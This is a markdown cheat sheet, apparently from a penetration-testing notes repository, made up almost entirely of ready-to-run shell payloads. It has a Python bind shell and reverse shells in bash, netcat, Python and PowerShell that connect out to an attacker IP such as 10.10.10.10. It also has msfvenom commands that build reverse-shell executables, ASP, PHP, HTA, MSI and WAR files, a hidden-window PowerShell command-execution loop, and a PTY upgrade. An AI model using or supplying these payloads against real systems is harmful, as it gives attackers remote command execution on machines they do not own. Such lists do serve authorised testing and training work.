<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/2_exploit_shells.mdd">Top of Page</a> |
  <a href="/CheatSheets/2_exploit_shells.md#bottom-of-page">Bottom of Page</a>
</p>

# Cheatsheets - Shells
## Table of Contents
* [Bind Shells](#bind-shells)
  * [Python](#python-bind-shell)
* [Reverse Shells](#reverse-shells)
  * [BASH](#bash-reverse-shells) 
  * [Msfvenom](#msfvenom-reverse-shells)
  * [Netcat](#netcat)
  * [PowerShell](#powershell-reverse-shells)
  * [Python](#python-reverse-shells) 
* [Upgrade to a PTY Shell](#upgrade-to-a-pty-shell)
  * [Python PTY Shell](#python-pty-shell) 

## Bind Shells
#### Python Bind Shell
```python
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",443));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

## Reverse Shells
#### Bash Reverse Shells
```bash
bash -i >& /dev/tcp/10.0.0.1/443 0>&1
```

#### Msfvenom Reverse Shells
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rshell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o rshell.asp
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rshell.php
msfvenom -p windows/shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f hta-psh -o rshell.hta
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f powershell
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o rshell.msi
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LPORT LPORT=$LPORT -f war > rshell.war
```

#### Netcat Reverse Shells
```bash
sudo nc -nv 10.10.10.10 443 -e /bin/bash
nc -nv 10.10.10.10 443 -e "/bin/bash"
```

#### PowerShell Reverse Shells
```bash
'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.11.12.13",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

#### Python Reverse Shells
```python
export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

## Upgrade to a PTY Shell
#### Python PTY Shell
```bash
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
python /tmp/shell.py
```

<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/2_exploit_shells.mdd">Top of Page</a> |
  <a href="/CheatSheets/2_exploit_shells.md#bottom-of-page">Bottom of Page</a>
</p>

## Bottom of Page
